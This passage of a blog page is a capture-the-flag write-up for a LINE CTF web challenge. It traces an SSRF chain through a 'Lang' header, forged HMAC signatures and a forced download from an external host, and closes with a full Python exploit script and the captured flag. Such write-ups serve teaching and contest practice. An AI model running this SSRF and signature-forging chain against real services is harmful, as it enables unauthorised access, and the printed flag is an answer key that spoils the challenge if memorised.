+<li>Using <code>ssrf</code> vulnerability to send a request to <code>/integrityStatus</code> to get the value of dbHash.</li>
+<li>Read the FLAG by sending a request to <code>/rollback</code> using the retrieved value of <code>dbHash</code>.</li>
+<li>FLAG is returned as a header value of lang.</li>
+</ol>
+<p>However, an exploit was attempted using the above scenario, but the attack could not be performed because the value of self.dbHash and <code>dbHash</code> in the <code>IntegrityCheck()</code> function had to be different.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">WriteFile</span>(url):
+</span></span><span style="display:flex;"><span>    local_filename <span style="color:#f92672">=</span> url<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;/&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> requests<span style="color:#f92672">.</span>get(url, stream<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>) <span style="color:#66d9ef">as</span> r:
+</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>raise_for_status()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;backup/&#39;</span><span style="color:#f92672">+</span>local_filename, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> chunk <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>iter_content(chunk_size<span style="color:#f92672">=</span><span style="color:#ae81ff">8192</span>): 
+</span></span><span style="display:flex;"><span>                f<span style="color:#f92672">.</span>write(chunk)
+</span></span></code></pre></div><p>So, when I analyzed the code again, I could see that the <code>WriteFile()</code> function was used to create a file under <code>backup/</code>. So, if you create any file using <code>WriteFile</code> function and send the name of the file to <code>dbHash</code>, it is not the same as the value of <code>self.dbHash</code>, which is a variable in the class, and it is Because it exists, it is enough to bypass it and read the flags.</p>
+<p>When I see inside the <code>WriteFile()</code> function, a request is sent using the <code>requests.get()</code> function, and the value of <code>url.split('/')[-1]</code> is used as the file name to create it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/download&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>,<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">download</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Sign&#39;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>dumps(status[<span style="color:#e6db74">&#39;sign&#39;</span>])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> SignCheck(request):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>dumps(status[<span style="color:#e6db74">&#39;sign&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;GET&#39;</span>:
+</span></span><span style="display:flex;"><span>            src <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;src&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> valid_download(src):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>dumps(status<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;false&#39;</span>))
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> valid_download(request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;src&#39;</span>]):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>dumps(status<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;false&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        WriteFile(src)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>dumps(status<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;success&#39;</span>))
+</span></span></code></pre></div><p>The <code>WriteFile()</code> function is called from <code>/download</code>. At this time, if the header value <code>Sign</code> exists, the return value of the <code>SignCheck()</code> function is true, and the <code>src</code> parameter value exists, <code>WriteFile()</code> function is executed.</p>
+<ul>
+<li>Scenario 2</li>
+</ul>
+<ol>
+<li>Using the <code>ssrf</code> vulnerability, a request was sent to <code>/download</code> to create a random file.</li>
+<li>Again, using the <code>ssrf</code> vulnerability, sending a request to <code>/rollback</code> to read the FLAG</li>
+<li>In this case, the <code>self.dbHash != dbHash</code> syntax is bypassed by using the file name.</li>
+<li>Finally, just read the <code>Lang</code> header.</li>
+</ol>
+<ul>
+<li>A note of caution</li>
+</ul>
+<ol>
+<li>When creating a file, a request is sent using the <code>requests.get()</code> function, so when creating a file, a <code>URL</code> must be sent to create it.</li>
+<li>The value of <code>dbHash</code> is parsed once more within the <code>RunRollbackDB()</code> function, and the value of <code>e.isalnum()</code> must be true.</li>
+<li>When reading the flag, the value of the environment variable <code>ENV</code> should not be <code>local</code>, so port <code>5000</code> should be used instead of port <code>5050</code>.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hmac
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://35.200.63.50/apis/&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Key <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha512((<span style="color:#e6db74">&#39;ed05a1c7ff6428dcf8d50901b6e78ba3&#39;</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;ascii&#39;</span>))<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;[+] Key  : &#39;</span> <span style="color:#f92672">+</span> Key)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sign</span>(KEY):
+</span></span><span style="display:flex;"><span>    privateKey <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;let</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">sbitcorinparty&#39;</span>
+</span></span><span style="display:flex;"><span>    EN <span style="color:#f92672">=</span> hmac<span style="color:#f92672">.</span>new( privateKey , KEY<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>), hashlib<span style="color:#f92672">.</span>sha512 )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> EN<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">integrityStatus</span>():
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Host&#39;</span>:<span style="color:#e6db74">&#39;localhost:5000&#39;</span>, <span style="color:#e6db74">&#39;Lang&#39;</span>:<span style="color:#e6db74">&#39;/integrityStatus&#39;</span>}
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;coin&#39;</span>, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] headers in /apis/integreityStatus : &#39;</span> <span style="color:#f92672">+</span> res<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;lang&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">download</span>():
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Host&#39;</span>:<span style="color:#e6db74">&#39;localhost:5000&#39;</span>, <span style="color:#e6db74">&#39;Lang&#39;</span>:<span style="color:#e6db74">&#39;download?src=http://141.164.52.207/a123&#39;</span>, <span style="color:#e6db74">&#39;Sign&#39;</span>:sign(<span style="color:#e6db74">&#39;src=http://141.164.52.207/a123&#39;</span>)}
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;coin&#39;</span>, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] headers in /apis/download : &#39;</span> <span style="color:#f92672">+</span> res<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;lang&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rollback</span>():
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Host&#39;</span>:<span style="color:#e6db74">&#39;localhost:5000&#39;</span>, <span style="color:#e6db74">&#39;Lang&#39;</span>:<span style="color:#e6db74">&#39;/rollback?dbhash=a123&#39;</span>, <span style="color:#e6db74">&#39;Sign&#39;</span>:sign(<span style="color:#e6db74">&#39;dbhash=a123&#39;</span>), <span style="color:#e6db74">&#39;Key&#39;</span>:Key}
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;coin&#39;</span>, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] headers in /apis/rollback : &#39;</span> <span style="color:#f92672">+</span> res<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;lang&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    integrityStatus()
+</span></span><span style="display:flex;"><span>    download()
+</span></span><span style="display:flex;"><span>    rollback()
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>FLAG : LINECTF{YOUNGCHAYOUNGCHABITCOINADAMYMONEYISBURNING}
+</span></span></code></pre></div>
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
